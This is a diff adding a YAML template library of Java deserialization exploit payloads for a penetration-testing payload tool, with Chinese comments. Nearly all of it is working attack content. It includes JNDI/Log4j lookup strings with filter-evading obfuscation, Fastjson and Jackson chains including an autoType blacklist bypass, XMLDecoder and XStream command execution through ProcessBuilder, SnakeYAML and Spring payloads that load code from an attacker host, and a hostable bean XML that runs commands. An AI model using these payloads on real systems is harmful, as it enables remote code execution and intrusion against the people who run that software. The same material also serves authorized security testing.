@@ -1,0 +1,496 @@
+ruleDB: v0.1.0
+# Java 反序列化模板。
+#
+# **只收文本形态的。** JDK 原生序列化的载荷是二进制字节流（`\xac\xed\x00\x05...`），
+# 本工具的载荷是文本串，表达不了——这类走 ysoserial 外部生成，见 §3 的边界说明。
+#
+# 好在实战里文本形态相当多：Fastjson/Jackson 是 JSON、XStream/XMLDecoder 是 XML、
+# SnakeYAML 是 YAML、JNDI 是纯字符串。而且 XML/JSON 有可靠 parser，能做真语法校验。
+
+templates:
+  - id: deser.java.jndi.ldap
+    name: JNDI 注入 LDAP
+    desc: 纯字符串形态，Log4j 那类 lookups 注入的本质
+    vuln: [deser]
+    content_type: [raw]
+    component: []
+    version: "*"
+    slots:
+      proto: {options: ["ldap", "rmi", "dns", "iiop"], default: "ldap"}
+    body: "${jndi:<<proto>>://<<lhost>>:<<lport>>/<<name>>}"
+    vars: [lhost, lport, name]
+    requires: [outbound, listener, fetch-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.java.fastjson.jdbcrowset
+    name: Fastjson JdbcRowSetImpl
+    desc: 最经典的 Fastjson 链，autoCommit 触发 JNDI 查询
+    vuln: [deser]
+    content_type: [json]
+    component: [fastjson]
+    version: "<1.2.69"
+    body: |-
+      {"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://<<lhost>>:<<lport>>/<<name>>","autoCommit":true}
+    vars: [lhost, lport, name]
+    requires: [outbound, listener, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.java.jackson.jdbcrowset
+    name: Jackson 多态 JdbcRowSetImpl
+    desc: 开启 DefaultTyping 时的 Jackson 链
+    vuln: [deser]
+    content_type: [json]
+    component: [jackson]
+    version: "*"
+    body: |-
+      ["com.sun.rowset.JdbcRowSetImpl",{"dataSourceName":"ldap://<<lhost>>:<<lport>>/<<name>>","autoCommit":true}]
+    vars: [lhost, lport, name]
+    requires: [outbound, listener, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.java.xmldecoder.process
+    name: XMLDecoder 执行命令
+    desc: 载荷是 XML，效果是跑 `<<cmd>>` 里的命令。XML 有可靠 parser，运行期会真做语法校验
+    vuln: [deser]
+    content_type: [xml]
+    component: [java]
+    version: "*"
+    slots:
+      # 解释器随目标系统变。原来写死 /bin/sh -c，Windows 目标上这条直接不可用，
+      # 而 ProcessBuilder 的参数个数不变——这正是「一组值必须联合选择」的典型场景。
+      sh:
+        options:
+          - {id: sh,  name: "Linux · /bin/sh -c",   shell: "/bin/sh",  flag: "-c"}
+          - {id: cmd, name: "Windows · cmd.exe /c", shell: "cmd.exe",  flag: "/c"}
+        default: sh
+    body: |-
+      <java version="1.8.0" class="java.beans.XMLDecoder">
+       <object class="java.lang.ProcessBuilder">
+        <array class="java.lang.String" length="3">
+         <void index="0"><string><<sh.shell>></string></void>
+         <void index="1"><string><<sh.flag>></string></void>
+         <void index="2"><string><<cmd>></string></void>
+        </array>
+        <void method="start"/>
+       </object>
+      </java>
+    vars: [cmd]
+    requires: [deser-sink]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.java.xstream.dynamicproxy
+    name: XStream 动态代理命令执行
+    desc: 载荷是 XML，效果是跑 `<<cmd>>` 里的命令
+    vuln: [deser]
+    content_type: [xml]
+    component: [xstream]
+    version: "<=1.4.17"
+    slots:
+      sh:
+        options:
+          - {id: sh,  name: "Linux · /bin/sh -c",   shell: "/bin/sh",  flag: "-c"}
+          - {id: cmd, name: "Windows · cmd.exe /c", shell: "cmd.exe",  flag: "/c"}
+        default: sh
+    body: |-
+      <sorted-set>
+        <string>foo</string>
+        <dynamic-proxy>
+          <interface>java.lang.Comparable</interface>
+          <handler class="java.beans.EventHandler">
+            <target class="java.lang.ProcessBuilder">
+              <command>
+                <string><<sh.shell>></string>
+                <string><<sh.flag>></string>
+                <string><<cmd>></string>
+              </command>
+            </target>
+            <action>start</action>
+          </handler>
+        </dynamic-proxy>
+      </sorted-set>
+    vars: [cmd]
+    requires: [weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.java.snakeyaml.scriptengine
+    name: SnakeYAML ScriptEngineManager
+    desc: 用 URLClassLoader 从远端加载类
+    vuln: [deser]
+    content_type: [yaml]
+    component: [snakeyaml]
+    version: "<=1.30"
+    body: |-
+      !!javax.script.ScriptEngineManager [
+        !!java.net.URLClassLoader [[
+          !!java.net.URL ["http://<<lhost>>/"]
+        ]]
+      ]
+    vars: [lhost]
+    requires: [outbound, listener, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.java.xmldecoder.file
+    name: XMLDecoder 读文件
+    desc: 用 java.io.File 的构造器把文件内容带到报错里
+    vuln: [deser]
+    content_type: [xml]
+    component: [java]
+    version: "*"
+    body: |-
+      <java version="1.8.0" class="java.beans.XMLDecoder">
+       <object class="java.io.File">
+        <string><<filepath>></string>
+       </object>
+      </java>
+    vars: [filepath]
+    requires: [deser-sink, error]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: deser.java.log4j.obfuscate
+    name: Log4j lookup 混淆
+    desc: JNDI 那条的混淆版。Log4j 会先把 ${...} 求值再拼接，所以 ${lower:j} 求值后就是个 j——过滤器看到的却是一堆 ${}
+    vuln: [deser]
+    content_type: [raw]
+    component: [log4j]
+    version: ">=2.0 <=2.17.0"
+    slots:
+      # YAML 的双引号标量里 $ 不需要转义（写 \$ 反而解析失败）
+      style:
+        options:
+          - {id: lower, name: "lower 小写化",  expr: "${lower:j}ndi:${lower:l}dap"}
+          - {id: upper, name: "upper 大写化",  expr: "${upper:J}NDI:${upper:L}DAP"}
+          - {id: dash,  name: "::- 空默认值", expr: "${${::-j}${::-n}${::-d}${::-i}:${${::-l}${::-d}${::-a}${::-p}}"}
+        default: lower
+    body: "<<style.expr>>://<<lhost>>:<<lport>>/<<name>>"
+    vars: [lhost, lport, name]
+    requires: [outbound, listener, fetch-sink]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.java.xmldecoder.runtime
+    name: XMLDecoder Runtime 执行命令
+    desc: ProcessBuilder 那条的替代。Runtime.getRuntime() 是静态方法，XMLDecoder 用 void class= method= 的形式调它
+    vuln: [deser]
+    content_type: [xml]
+    component: [java]
+    version: "*"
+    slots:
+      sh:
+        options:
+          - {id: sh,  name: "Linux · /bin/sh -c",   shell: "/bin/sh",  flag: "-c"}
+          - {id: cmd, name: "Windows · cmd.exe /c", shell: "cmd.exe",  flag: "/c"}
+        default: sh
+    body: |-
+      <java version="1.8.0" class="java.beans.XMLDecoder">
+       <void class="java.lang.Runtime" method="getRuntime">
+        <object method="exec">
+         <array class="java.lang.String" length="3">
+          <void index="0"><string><<sh.shell>></string></void>
+          <void index="1"><string><<sh.flag>></string></void>
+          <void index="2"><string><<cmd>></string></void>
+         </array>
+        </object>
+       </void>
+      </java>
+    vars: [cmd]
+    requires: [deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- Fastjson ----
+  # autoType 的黑名单经历了三代：按字符串匹配 → 按类名匹配 + 缓存类 → 默认关闭（1.2.68 起
+  # 除 expectClass 白名单外一律拒绝）。下面两条分别打第一代和第二代。
+
+  - id: deser.java.fastjson.jdbcrowset.bypass
+    name: Fastjson 黑名单绕过（L 前缀）
+    desc: >-
+      autoType 黑名单按类名字符串匹配时，`L...;` 这种反序列化描述符写法能绕过去——
+      黑名单看到的是 "Lcom.sun.rowset.JdbcRowSetImpl;"，不是它要拦的那一串。
+      只在 1.2.25 ~ 1.2.41 这类按字符串匹配的版本上成立；开了 safeMode、
+      或升到 1.2.68 之后（除非走 expectClass 白名单）这条一定无效，别浪费时间。
+      同一条链的普通写法见 deser.java.fastjson.jdbcrowset。
+    vuln: [deser]
+    content_type: [json]
+    component: [fastjson]
+    version: ">=1.2.25 <=1.2.41"
+    body: |-
+      {"@type":"Lcom.sun.rowset.JdbcRowSetImpl;","dataSourceName":"ldap://<<lhost>>:<<lport>>/<<name>>","autoCommit":true}
+    vars: [lhost, lport, name]
+    requires: [outbound, listener, weak-hardening]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.java.fastjson.templatesimpl
+    name: Fastjson TemplatesImpl 字节码
+    desc: >-
+      不需要出网的那条 Fastjson 链：恶意类的字节码塞进 _bytecodes，
+      TemplatesImpl 在 getOutputProperties 时把它 defineClass 出来。
+      两个前提缺一不可——parse 时必须打开 Feature.SupportNonPublicField（默认是关的），
+      字节码得自己生成（javac 编译后用 ysoserial 的 TemplatesImpl 马，
+      本工具只给外壳，b64 是外部生成器的产物）。目标出不了网时优先试它。
+    vuln: [deser]
+    content_type: [json]
+    component: [fastjson]
+    version: "<=1.2.68"
+    body: |-
+      {"@type":"com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl","_bytecodes":["<<b64>>"],"_name":"a","_tfactory":{},"_outputProperties":{}}
+    vars: [b64]
+    requires: [generator, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.java.fastjson.dns
+    name: Fastjson 出网探测（DNS）
+    desc: >-
+      先确认「这里是不是 Fastjson、autoType 开没开」再决定上哪条链。Inet4Address
+      会去解析 val 里的主机名，dnslog 上有记录就说明 autoType 是开的。
+      不改目标状态、不需要 listener，但不能证明能 RCE —— 探测到之后还要试
+      jdbcrowset 或 templatesimpl。
+    vuln: [deser]
+    content_type: [json]
+    component: [fastjson]
+    version: "*"
+    body: |-
+      {"@type":"java.net.Inet4Address","val":"<<domain>>"}
+    vars: [domain]
+    requires: [outbound]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- Jackson ----
+
+  - id: deser.java.jackson.templatesimpl
+    name: Jackson 多态 TemplatesImpl
+    desc: >-
+      开启 DefaultTyping 时的 Jackson 链，同样不需要出网。前提是
+      enableDefaultTyping / activateDefaultTyping 对 Object 那档生效（只对非 final
+      类型、且有可用构造器的类走多态），并且目标版本的黑名单没盖上 TemplatesImpl。
+      关掉 DefaultTyping 的应用上这条不成立——那时 Jackson 只是普通 JSON 解析器。
+    vuln: [deser]
+    content_type: [json]
+    component: [jackson]
+    version: "*"
+    body: |-
+      ["com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl",{"_bytecodes":["<<b64>>"],"_name":"a","_tfactory":{},"_outputProperties":{}}]
+    vars: [b64]
+    requires: [generator, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.java.jackson.springboot
+    name: Jackson 加载远程 Spring 上下文
+    desc: >-
+      DefaultTyping 下把下一个对象换成 Spring 的 ClassPathXmlApplicationContext，
+      构造器的 String 参数被当成配置文件地址去取——等于让目标加载你托管的 bean XML
+      （见 deser.java.spring.beanxml）。要求目标 classpath 上有 spring-context
+      且出得了网。目标不出网时换 jackson.templatesimpl。
+    vuln: [deser]
+    content_type: [json]
+    component: [jackson, spring]
+    version: "*"
+    body: |-
+      ["org.springframework.context.support.ClassPathXmlApplicationContext","http://<<lhost>>/bean.xml"]
+    vars: [lhost]
+    requires: [outbound, listener, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- SnakeYAML ----
+  # ScriptEngineManager 那条靠 URLClassLoader 从远端拉类；这两条换成
+  # 「直接触发 JNDI」和「直接加载 Spring 上下文」，都是目标出网就能用。
+
+  - id: deser.java.snakeyaml.jdbcrowset
+    name: SnakeYAML JdbcRowSetImpl
+    desc: >-
+      SnakeYAML 会用无参构造器建对象再按 setter 赋值，所以 !!类名 加一组键值
+      就能走到 setAutoCommit，触发和 Fastjson 那条一样的 JNDI 查询。
+      比 ScriptEngineManager 少依赖一个可写目录（不用落地 jar），
+      但同样要求目标出网、且 yaml.load 用的是非 SafeConstructor。
+    vuln: [deser]
+    content_type: [yaml]
+    component: [snakeyaml]
+    version: "<=1.30"
+    body: |-
+      !!com.sun.rowset.JdbcRowSetImpl
+        dataSourceName: "ldap://<<lhost>>:<<lport>>/<<name>>"
+        autoCommit: true
+    vars: [lhost, lport, name]
+    requires: [outbound, listener, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.java.snakeyaml.spring
+    name: SnakeYAML 加载远程 Spring 上下文
+    desc: >-
+      !!java.net.URL 那条的替代路线：让 SnakeYAML 直接构造 Spring 的
+      ClassPathXmlApplicationContext，参数是你托管的 bean XML 地址。
+      要求目标 classpath 上有 spring-context、出得了网、且 yaml.load 没换成
+      SafeConstructor。具体能不能取到 URL 形式的配置要看 Spring 版本，先在实验室确认。
+    vuln: [deser]
+    content_type: [yaml]
+    component: [snakeyaml, spring]
+    version: "<=1.30"
+    body: |-
+      !!org.springframework.context.support.ClassPathXmlApplicationContext ["http://<<lhost>>/bean.xml"]
+    vars: [lhost]
+    requires: [outbound, listener, weak-hardening]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- Log4j ----
+
+  - id: deser.java.log4j.obfuscate.env
+    name: Log4j lookup 混淆（env / sys 嵌套）
+    desc: >-
+      obfuscate 那条的补充形态。`${env:X:-j}` 里的 X 取一个目标上一定没有的环境
+      变量名时，求值结果就是默认值 j ——过滤器解不开这层嵌套，Log4j 解得开；
+      嵌套的 ${lower:${lower:j}} 同理。只在过滤器是按明文/单层 ${} 匹配时有用；
+      目标把整段 ${} 删掉、或升到 2.17 之后，这条和普通的 ${jndi:} 一样无效。
+    vuln: [deser]
+    content_type: [raw]
+    component: [log4j]
+    version: ">=2.0 <=2.17.0"
+    slots:
+      # YAML 单引号标量里 $ 和 {} 都是普通字符，Log4j 那堆 ${} 不用转义
+      style:
+        options:
+          - {id: env-default, name: "env 取默认值", expr: '${${env:X:-j}ndi:${env:X:-l}dap}'}
+          - {id: sys-default, name: "sys 取默认值", expr: '${${sys:x:-j}ndi:${sys:x:-l}dap}'}
+          - {id: lower-nested, name: "lower 双层嵌套", expr: '${lower:${lower:j}}ndi:${lower:${lower:l}}dap'}
+          - {id: upper-nested, name: "upper 套 lower", expr: '${upper:${lower:j}ndi}:${upper:${lower:l}dap}'}
+        default: env-default
+    body: "<<style.expr>>://<<lhost>>:<<lport>>/<<name>>"
+    vars: [lhost, lport, name]
+    requires: [outbound, listener, fetch-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- Spring：几条「加载远程 Spring 上下文」的链要用的服务端文件 ----
+
+  - id: deser.java.spring.beanxml
+    name: Spring bean XML 远程加载
+    desc: >-
+      Jackson / SnakeYAML / Fastjson 那几条「加载远程 Spring 上下文」的链要的**服务端
+      文件**：托管在 lhost 上，被加载时 ProcessBuilder 直接 start。
+      只在目标 classpath 上有 spring-beans、且应用真的去取这个 URL 时成立——
+      它是本机 JVM 去下载的，所以目标必须出得了网。改成别的 bean 也能当通用的
+      Spring XML 执行点用。
+    vuln: [deser]
+    content_type: [xml]
+    component: [spring]
+    version: "*"
+    slots:
+      sh:
+        options:
+          - {id: sh,  name: "Linux · /bin/sh -c",   shell: "/bin/sh",  flag: "-c"}
+          - {id: cmd, name: "Windows · cmd.exe /c", shell: "cmd.exe",  flag: "/c"}
+        default: sh
+    body: |-
+      <?xml version="1.0" encoding="UTF-8"?>
+      <beans xmlns="http://www.springframework.org/schema/beans"
+             xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
+             xsi:schemaLocation="http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd">
+        <bean id="pb" class="java.lang.ProcessBuilder" init-method="start">
+          <constructor-arg>
+            <list>
+              <value><<sh.shell>></value>
+              <value><<sh.flag>></value>
+              <value><<cmd>></value>
+            </list>
+          </constructor-arg>
+        </bean>
+      </beans>
+    vars: [cmd]
+    requires: [listener, outbound]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: deser.java.xmldecoder.ssrf
+    name: XMLDecoder 出网探测
+    desc: >-
+      XMLDecoder 的 <void method=.../> 能调无参方法，所以在 URL 对象上直接调
+      openStream() 就会发起一次 HTTP 请求。只用来证明「这里是 XMLDecoder 且出得了网」，
+      不改目标状态、不落地；目标不出网时这条和别的出网载荷一样没用。
+    vuln: [deser]
+    content_type: [xml]
+    component: [java]
+    version: "*"
+    body: |-
+      <java version="1.8.0" class="java.beans.XMLDecoder">
+       <object class="java.net.URL">
+        <string>http://<<lhost>>/</string>
+        <void method="openStream"/>
+       </object>
+      </java>
+    vars: [lhost]
+    requires: [outbound, listener, deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 外部生成器的粘贴位 ----
+  # ysoserial 的产出是 Java 原生序列化的**二进制**，本工具只产文本、表达不了。
+  # 所以流程是：外部生成 → base64 → 贴到这里 → 用提交方式投递。
+  # 与 `deser.python.pickle.b64` 同一条思路，补上 Java 缺的那半边。
+
+  - id: deser.java.external.b64
+    name: Java 反序列化 · 粘贴 base64（外部生成器）
+    desc: >
+      ysoserial 产出的载荷 base64 之后贴进来。Shiro 的 rememberMe、以及各种
+      把 Cookie/参数 base64 解码后交给 ObjectInputStream.readObject 的点都走这条。
+      base64 看不出结构，所以不做语法校验。
+    vuln: [deser]
+    content_type: [raw]
+    component: [java]
+    version: "*"
+    body: '<<b64>>'
+    vars: [b64]
+    requires: [generator, deser-sink]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-19
